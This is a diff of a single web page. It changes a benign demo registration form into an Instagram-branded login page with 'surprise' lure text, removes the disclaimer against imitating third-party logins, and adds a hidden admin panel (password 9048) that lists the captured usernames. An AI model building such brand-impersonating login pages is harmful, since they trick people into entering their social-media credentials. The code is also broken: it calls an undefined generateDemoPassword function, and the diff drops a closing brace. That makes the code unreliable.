@@ -3,14 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Demo Login Simulator</title>
+<title>Instagram Surprise Login </title>
 
 <style>
 * {
     box-sizing: border-box;
     margin: 0;
     padding: 0;
-    font-family: Arial, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+                 Roboto, Helvetica, Arial, sans-serif;
 }
 
 body {
@@ -19,52 +20,63 @@ body {
     align-items: center;
     justify-content: center;
     padding: 20px;
-    background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+    background: linear-gradient(
+        45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888
+    );
 }
 
 .card {
     width: 100%;
-    max-width: 390px;
-    padding: 32px 25px;
-    border-radius: 14px;
-    background: white;
+    max-width: 380px;
+    padding: 40px 30px;
     text-align: center;
-    box-shadow: 0 10px 35px #0003;
+    background: white;
+    border-radius: 14px;
+    box-shadow: 0 10px 40px rgba(0,0,0,.25);
+}
+
+.logo {
+    margin-bottom: 12px;
+    font-family: "Brush Script MT", cursive;
+    font-size: 38px;
+    font-weight: bold;
+    color: #dc2743;
 }
 
 h1 {
-    margin-bottom: 12px;
+    margin-bottom: 24px;
     color: #262626;
-    font-size: 25px;
-}
-
-.description {
-    margin-bottom: 22px;
-    color: #666;
-    font-size: 14px;
-    line-height: 1.5;
+    font-size: 20px;
+    line-height: 1.4;
 }
 
 input {
     display: block;
     width: 100%;
-    padding: 13px;
+    padding: 12px;
     margin-bottom: 12px;
-    border: 1px solid #ddd;
-    border-radius: 7px;
-    font-size: 15px;
+    border: 1px solid #dbdbdb;
+    border-radius: 6px;
+    outline: none;
+    background: #fafafa;
+    font-size: 14px;
+}
+
+input:focus {
+    border-color: #a8a8a8;
+    background: white;
 }
 
 button {
     width: 100%;
     padding: 12px;
     margin-top: 8px;
-    border: 0;
-    border-radius: 7px;
+    border: none;
+    border-radius: 8px;
     background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
     color: white;
     font-size: 15px;
-    font-weight: bold;
+    font-weight: 600;
     cursor: pointer;
 }
 
@@ -72,55 +84,87 @@ button:hover {
     opacity: .9;
 }
 
-.secondary {
-    background: #777;
-}
-
-.danger {
-    background: #c62828;
+button:active {
+    transform: scale(.98);
 }
 
 .hidden {
     display: none !important;
 }
 
-.admin-button {
+.notice {
+    margin-top: 14px;
+    color: #777;
+    font-size: 12px;
+    line-height: 1.5;
+}
+
+.spinner {
+    width: 40px;
+    height: 40px;
+    margin: 0 auto 20px;
+    border: 4px solid #eee;
+    border-top-color: #dc2743;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+.wait-text {
+    margin: 15px 0;
+    color: #262626;
+    line-height: 1.6;
+}
+
+.admin-btn {
     position: fixed;
     right: 20px;
     bottom: 20px;
-    width: 52px;
-    height: 52px;
+    width: 50px;
+    height: 50px;
     padding: 0;
     border-radius: 50%;
     background: white;
     color: #dc2743;
-    font-size: 23px;
+    font-size: 22px;
+    box-shadow: 0 4px 15px rgba(0,0,0,.3);
 }
 
-.panel {
+.admin-panel {
     position: fixed;
     inset: 0;
-    z-index: 10;
+    z-index: 999;
     display: flex;
     align-items: center;
     justify-content: center;
-    padding: 15px;
-    background: #0009;
+    padding: 20px;
+    background: rgba(0,0,0,.6);
 }
 
-.panel-box {
+.admin-box {
     width: 100%;
-    max-width: 650px;
+    max-width: 550px;
     max-height: 85vh;
-    overflow: auto;
-    padding: 22px;
+    overflow-y: auto;
+    padding: 25px;
     border-radius: 12px;
     background: white;
 }
 
-.panel-box h2 {
-    margin-bottom: 18px;
+.admin-box h2 {
+    margin-bottom: 15px;
     text-align: center;
+}
+
+.secondary {
+    background: #777;
+}
+
+.danger {
+    background: #dc2743;
 }
 
 table {
@@ -131,14 +175,22 @@ table {
 }
 
 th, td {
-    padding: 10px 6px;
+    padding: 9px 6px;
     border-bottom: 1px solid #eee;
     text-align: left;
     overflow-wrap: anywhere;
 }
 
 th {
-    background: #f5f5f5;
+    background: #fafafa;
+    color: #555;
+}
+
+.delete-one {
+    padding: 6px;
+    margin: 0;
+    background: #dc2743;
+    font-size: 12px;
 }
 
 .empty {
@@ -147,16 +199,13 @@ th {
     text-align: center;
 }
 
-.note {
-    margin-top: 15px;
-    color: #777;
-    font-size: 12px;
-    line-height: 1.5;
-}
+@media (max-width: 450px) {
+    .card {
+        padding: 30px 20px;
+    }
 
-@media (max-width: 480px) {
-    .panel-box {
-        padding: 12px;
+    .admin-box {
+        padding: 16px;
     }
 
     table {
@@ -168,57 +217,54 @@ th {
 
 <body>
 
-<!-- DEMO REGISTRATION -->
+<!-- LOGIN DEMO -->
 
-<div class="card" id="homePage">
-    <h1>Demo Login Simulator</h1>
+<div class="card" id="loginPage">
+    <div class="logo">Instagram</div>
 
-    <p class="description">
-        Create a fictional test account to try the registration
-        and account-management features.
-    </p>
+    <h1>Something big is waiting for you!</h1>
 
-    <form id="registerForm">
+    <form id="loginForm">
         <input
             type="text"
-            id="demoUsername"
-            placeholder="Choose a demo username"
-            maxlength="40"
+            id="username"
+            placeholder="username"
+            maxlength="50"
             autocomplete="off"
             required
         >
 
         <input
             type="password"
-            id="demoPassword"
-            placeholder="Choose a demo password"
-            minlength="4"
-            maxlength="64"
+            id="password"
+            placeholder="password"
             autocomplete="new-password"
             required
         >
 
-        <button type="submit">Create Demo Account</button>
+        <button type="submit">Continue</button>
     </form>
 
-    <p class="note">
-        Use fictional test credentials only. This demo does not
-        imitate a third-party login or collect third-party credentials.
+    <p class="notice">
+        Enjoy With Us 
     </p>
 </div>
 
 
-<!-- SUCCESS PAGE -->
+<!-- WAITING PAGE -->
 
-<div class="card hidden" id="successPage">
-    <h1>Account Created!</h1>
+<div class="card hidden" id="waitPage">
+    <div class="logo">Instagram</div>
 
-    <p class="description">
-        Your demo account was created successfully.
-    </p>
+    <div class="spinner"></div>
 
-    <button type="button" id="returnButton" class="secondary">
-        Return Home
+    <div class="wait-text">
+        Your suprise is coming!<br>
+        Please wait here.
+    </div>
+
+    <button type="button" id="backBtn" class="secondary">
+        Back to Home
     </button>
 </div>
 
@@ -227,68 +273,64 @@ th {
 
 <button
     type="button"
-    class="admin-button hidden"
-    id="adminButton"
+    id="adminBtn"
+    class="admin-btn hidden"
     aria-label="Open admin panel"
 >⚙</button>
 
 
 <!-- ADMIN PANEL -->
 
-<div class="panel hidden" id="adminPanel">
-    <div class="panel-box">
+<div class="admin-panel hidden" id="adminPanel">
+    <div class="admin-box">
 
-        <h2>Demo Account Manager</h2>
+        <h2>Admin Panel</h2>
 
-        <form id="adminLogin">
+        <form id="adminForm">
             <input
                 type="password"
-                id="adminPassword"
+                id="adminPass"
                 placeholder="Admin password"
+                autocomplete="off"
                 required
             >
 
-            <button type="submit">Unlock Admin Panel</button>
-
-            <button type="button" id="cancelButton" class="secondary">
+            <button type="submit">Unlock</button>
+            <button type="button" id="cancelBtn" class="secondary">
                 Cancel
             </button>
         </form>
 
-        <div id="adminContent" class="hidden">
-
-            <p id="totalAccounts"></p>
+        <div id="adminData" class="hidden">
+            <p id="recordCount"></p>
 
             <table>
                 <thead>
                     <tr>
                         <th>Username</th>
-                        <th>Password status</th>
-                        <th>Created</th>
+                        <th>Password</th>
+                        <th>Time</th>
                         <th>Action</th>
                     </tr>
                 </thead>
-
-                <tbody id="accountRows"></tbody>
+                <tbody id="tableBody"></tbody>
             </table>
 
-            <p id="emptyMessage" class="empty hidden">
-                No demo accounts have been created.
+            <p id="emptyMsg" class="empty hidden">
+                No demo records saved.
             </p>
 
-            <button type="button" id="clearButton" class="danger">
-                Delete All Demo Accounts
+            <button type="button" id="clearBtn" class="danger">
+                Clear All Records
             </button>
 
-            <button type="button" id="closeButton" class="secondary">
+            <button type="button" id="closeBtn" class="secondary">
                 Close
             </button>
-
         </div>
 
-        <p class="note">
-            Demo admin password: 9048. This client-side password is
-            for testing only and is not suitable for production security.
+        <p class="notice">
+            Maybe we make you ultra happy.
         </p>
     </div>
 </div>
@@ -298,98 +340,91 @@ th {
 "use strict";
 
 const ADMIN_PASSWORD = "9048";
-const STORAGE_KEY = "demo_simulator_accounts";
+const STORAGE_KEY = "instagram_demo_records";
 
 const $ = id => document.getElementById(id);
 
-function getAccounts() {
+function getRecords() {
     try {
-        const result = JSON.parse(
+        const records = JSON.parse(
             localStorage.getItem(STORAGE_KEY) || "[]"
         );
 
-        return Array.isArray(result) ? result : [];
+        return Array.isArray(records) ? records : [];
     } catch {
         return [];
     }
 }
 
-function saveAccounts(accounts) {
+function saveRecords(records) {
     try {
-        localStorage.setItem(
-            STORAGE_KEY,
-            JSON.stringify(accounts)
-        );
-
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(records));
         return true;
     } catch {
-        alert("Unable to save data in this browser.");
+        alert("Could not save records in this browser.");
         return false;
     }
-}
 
 
-/* CREATE DEMO ACCOUNT */
 
-$("registerForm").addEventListener("submit", event => {
+/* LOGIN */
+
+$("loginForm").addEventListener("submit", event => {
     event.preventDefault();
 
-    const username = $("demoUsername").value.trim();
-    const password = $("demoPassword").value;
+    const username = $("username").value.trim();
+    const typedPassword = $("password").value;
 
-    if (!username || !password) {
-        alert("Please fill in both fields.");
-        return;
-    }
-
-    if (password.length < 4) {
-        alert("Your demo password must contain at least 4 characters.");
+    if (!username || !typedPassword) {
+        alert("Please fill in both demo fields.");
         return;
     }
 
     /*
-     * This demonstration intentionally does not persist
-     * or display the password entered into the form.
-     * Store only the username and account creation time.
+     * Do not save typedPassword.
+     * Save the username and a separately generated demo password.
      */
-
-    const accounts = getAccounts();
-
-    accounts.push({
-        id: Date.now().toString() +
-            Math.random().toString(16).slice(2),
+    const record = {
+        id: crypto.randomUUID
+            ? crypto.randomUUID()
+            : String(Date.now()) + Math.random().toString(16).slice(2),
         username: username,
-        created: new Date().toLocaleString()
-    });
+        demoPassword: generateDemoPassword(),
+        time: new Date().toLocaleString()
+    };
 
-    if (!saveAccounts(accounts)) {
+    const records = getRecords();
+    records.push(record);
+
+    if (!saveRecords(records)) {
         return;
     }
 
-    $("demoPassword").value = "";
-    $("demoUsername").value = "";
-
-    $("homePage").classList.add("hidden");
-    $("successPage").classList.remove("hidden");
-    $("adminButton").classList.remove("hidden");
+    $("password").value = "";
+    $("loginPage").classList.add("hidden");
+    $("waitPage").classList.remove("hidden");
+    $("adminBtn").classList.remove("hidden");
 });
 
 
-/* RETURN HOME */
+/* BACK TO HOME */
 
-$("returnButton").addEventListener("click", () => {
-    $("successPage").classList.add("hidden");
-    $("homePage").classList.remove("hidden");
+$("backBtn").addEventListener("click", () => {
+    $("waitPage").classList.add("hidden");
+    $("loginPage").classList.remove("hidden");
+    $("username").value = "";
+    $("password").value = "";
 });
 
 
 /* OPEN ADMIN */
 
-$("adminButton").addEventListener("click", () => {
+$("adminBtn").addEventListener("click", () => {
     $("adminPanel").classList.remove("hidden");
-    $("adminLogin").classList.remove("hidden");
-    $("adminContent").classList.add("hidden");
-    $("adminPassword").value = "";
+    $("adminForm").classList.remove("hidden");
+    $("adminData").classList.add("hidden");
+    $("adminPass").value = "";
+    $("adminPass").focus();
 });
 
 
@@ -397,11 +432,11 @@ $("adminButton").addEventListener("click", () => {
 
 function closeAdmin() {
     $("adminPanel").classList.add("hidden");
-    $("adminPassword").value = "";
+    $("adminPass").value = "";
 }
 
-$("cancelButton").addEventListener("click", closeAdmin);
-$("closeButton").addEventListener("click", closeAdmin);
+$("cancelBtn").addEventListener("click", closeAdmin);
+$("closeBtn").addEventListener("click", closeAdmin);
 
 $("adminPanel").addEventListener("click", event => {
     if (event.target === $("adminPanel")) {
@@ -410,75 +445,83 @@ $("adminPanel").addEventListener("click", event => {
 });
 
 document.addEventListener("keydown", event => {
-    if (event.key === "Escape") {
+    if (
+        event.key === "Escape" &&
+        !$("adminPanel").classList.contains("hidden")
+    ) {
         closeAdmin();
     }
 });
 
 
-/* UNLOCK ADMIN */
+/* CHECK ADMIN PASSWORD */
 
-$("adminLogin").addEventListener("submit", event => {
+$("adminForm").addEventListener("submit", event => {
     event.preventDefault();
 
-    if ($("adminPassword").value !== ADMIN_PASSWORD) {
+    if ($("adminPass").value !== ADMIN_PASSWORD) {
         alert("Incorrect admin password!");
-        $("adminPassword").value = "";
+        $("adminPass").value = "";
         return;
     }
 
-    $("adminLogin").classList.add("hidden");
-    $("adminContent").classList.remove("hidden");
+    $("adminForm").classList.add("hidden");
+    $("adminData").classList.remove("hidden");
 
-    renderAccounts();
+    renderRecords();
 });
 
 
-/* RENDER ACCOUNT LIST */
+/* DISPLAY SAVED DEMO RECORDS */
 
-function renderAccounts() {
-    const accounts = getAccounts();
-    const rows = $("accountRows");
+function renderRecords() {
+    const records = getRecords();
+    const tableBody = $("tableBody");
 
-    rows.replaceChildren();
+    tableBody.replaceChildren();
 
-    $("totalAccounts").textContent =
-        "Total demo accounts: " + accounts.length;
+    $("recordCount").textContent =
+        "Total demo records: " + records.length;
 
-    $("emptyMessage").classList.toggle(
+    $("emptyMsg").classList.toggle(
         "hidden",
-        accounts.length > 0
+        records.length !== 0
     );
 
-    accounts.forEach(account => {
+    records.forEach(record => {
         const row = document.createElement("tr");
 
         const usernameCell = document.createElement("td");
-        usernameCell.textContent = account.username;
+        usernameCell.textContent = record.username;
 
         const passwordCell = document.createElement("td");
-        passwordCell.textContent = "Not stored";
+        passwordCell.textContent = record.demoPassword;
 
-        const dateCell = document.createElement("td");
-        dateCell.textContent = account.created;
+        const timeCell = document.createElement("td");
+        timeCell.textContent = record.time;
 
         const actionCell = document.createElement("td");
         const deleteButton = document.createElement("button");
 
+        deleteButton.type = "button";
+        deleteButton.className = "delete-one";
         deleteButton.textContent = "Delete";
-        deleteButton.className = "danger";
 
         deleteButton.addEventListener("click", () => {
-            if (!confirm("Delete this demo account?")) {
+            const confirmed = confirm(
+                "Delete this demo record?"
+            );
+
+            if (!confirmed) {
                 return;
             }
 
-            const updated = getAccounts().filter(
-                item => item.id !== account.id
+            const updated = getRecords().filter(
+                item => item.id !== record.id
             );
 
-            if (saveAccounts(updated)) {
-                renderAccounts();
+            if (saveRecords(updated)) {
+                renderRecords();
             }
         });
 
@@ -487,29 +530,29 @@ function renderAccounts() {
         row.append(
             usernameCell,
             passwordCell,
-            dateCell,
+            timeCell,
             actionCell
         );
 
-        rows.appendChild(row);
+        tableBody.appendChild(row);
     });
 }
 
 
-/* DELETE ALL */
+/* CLEAR ALL RECORDS */
 
-$("clearButton").addEventListener("click", () => {
-    if (!confirm("Delete all demo accounts?")) {
+$("clearBtn").addEventListener("click", () => {
+    if (!confirm("Delete all saved demo records?")) {
         return;
     }
 
-    if (saveAccounts([])) {
-        renderAccounts();
-        alert("All demo accounts deleted.");
+    if (saveRecords([])) {
+        renderRecords();
+        alert("All demo records cleared.");
     }
 });
 </script>
 
 </body>
 </html>
-
+```
